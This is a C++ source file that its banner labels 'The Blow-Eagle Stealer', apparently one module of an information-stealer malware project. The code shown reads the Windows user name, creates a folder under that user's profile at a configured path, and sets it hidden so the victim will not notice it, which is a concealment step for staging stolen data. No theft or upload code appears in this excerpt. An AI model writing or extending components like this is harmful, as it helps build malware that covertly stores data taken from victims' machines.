/*
==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗|
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝|
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░|
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░|
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗|
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝|
|                                                                                                                 |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                         |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                         |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                         |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                         |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                         |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                         |
==================================================================================================================|
*/
#include "../scripts.h"
#include "../../config/config.h"
#include <windows.h>
#include <Lmcons.h>
#include <direct.h>
#include <string.h>

std::wstring StringToWideString(const std::string&);

void manager::MakeDirs()
{
	TCHAR string[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)string, &size);
	std::wstring ws(string);
	std::string userName(ws.begin(), ws.end());
	std::string pathto = "C:/Users/" + userName + config::path;
	std::wstring wpathto = StringToWideString(pathto);

	int result = _mkdir(pathto.c_str());
	BOOL success = SetFileAttributes(wpathto.c_str(), FILE_ATTRIBUTE_HIDDEN);
	if (success != 0) {
			std::cout << "Folder hidden successfully!" << std::endl;
	}
	else {
			DWORD error = GetLastError();
			std::cerr << "Failed to hide folder. Error code: " << error << std::endl;
	}
}

std::wstring StringToWideString(const std::string& str) {


	int length = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, nullptr, 0);
	std::wstring wideStr(length, 0);
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, &wideStr[0], length);
	return wideStr;
}